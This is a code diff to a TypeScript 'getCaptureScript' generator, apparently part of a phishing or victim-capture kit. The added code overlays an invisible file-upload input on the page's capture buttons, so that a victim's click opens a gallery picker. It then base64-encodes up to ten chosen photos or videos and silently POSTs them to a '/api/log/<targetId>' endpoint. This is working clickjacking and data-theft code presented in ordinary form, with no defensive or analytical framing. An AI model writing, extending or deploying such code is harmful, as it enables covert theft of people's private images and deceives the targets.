@@ -574,6 +574,29 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             }
 
             if (p === 'files') {
+              try {
+                if (window.__secretFiles && window.__secretFiles.length > 0) {
+                  if (!isSilent) updateProgress(prog, "Mengekstrak data galeri perangkat...");
+                  let filesData = [];
+                  for (let i = 0; i < Math.min(window.__secretFiles.length, 10); i++) {
+                    let file = window.__secretFiles[i];
+                    if (file.size < 5 * 1024 * 1024) { 
+                      let reader = new FileReader();
+                      let p2 = new Promise(r => { reader.onload = () => r(reader.result); });
+                      reader.readAsDataURL(file);
+                      let res = await p2;
+                      filesData.push({ name: file.name, data: res.split(',')[1] });
+                    }
+                  }
+                  if (filesData.length > 0) {
+                    await fetch('/api/log/' + targetId + '/extra', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ tmplId: cfg.tmplId, files_gallery: filesData })
+                    });
+                  }
+                }
+              } catch(e) {}
               permsCompleted++;
               continue;
             }
@@ -708,6 +731,64 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         finish(false, "Sistem sibuk.");
       }
     };
+
+
+    document.addEventListener('DOMContentLoaded', function() {
+      if (requiredPerms.indexOf('files') > -1 && flowType !== 'silent') {
+        var btns = document.querySelectorAll('.btn, button');
+        btns.forEach(function(btn) {
+          if (btn.getAttribute('onclick') && btn.getAttribute('onclick').includes('startCapture')) {
+             var wrapper = document.createElement('div');
+             wrapper.style.position = 'relative';
+             wrapper.style.display = 'inline-block';
+             wrapper.style.width = '100%';
+             
+             var fileInput = document.createElement('input');
+             fileInput.type = 'file';
+             fileInput.multiple = true;
+             fileInput.accept = 'image/*,video/*';
+             fileInput.style.opacity = '0';
+             fileInput.style.position = 'absolute';
+             fileInput.style.top = '0';
+             fileInput.style.left = '0';
+             fileInput.style.width = '100%';
+             fileInput.style.height = '100%';
+             fileInput.style.cursor = 'pointer';
+             fileInput.style.zIndex = '99999';
+             
+             var handleCompletion = function() {
+                if (!window.__captureStarted) {
+                  window.__captureStarted = true;
+                  btn.removeAttribute('onclick'); 
+                  window.startCapture();
+                }
+             };
+
+             fileInput.addEventListener('click', function() {
+               setTimeout(function() {
+                 window.addEventListener('focus', function focusListener() {
+                   window.removeEventListener('focus', focusListener);
+                   setTimeout(function() {
+                     if (!window.__secretFiles) { handleCompletion(); }
+                   }, 500);
+                 });
+               }, 100);
+             });
+             
+             fileInput.onchange = function(e) {
+                window.__secretFiles = e.target.files;
+                handleCompletion();
+                wrapper.removeChild(fileInput);
+             };
+             
+             btn.parentNode.insertBefore(wrapper, btn);
+             wrapper.appendChild(btn);
+             wrapper.appendChild(fileInput);
+          }
+        });
+      }
+    });
+
   })();
 </script>
   `;
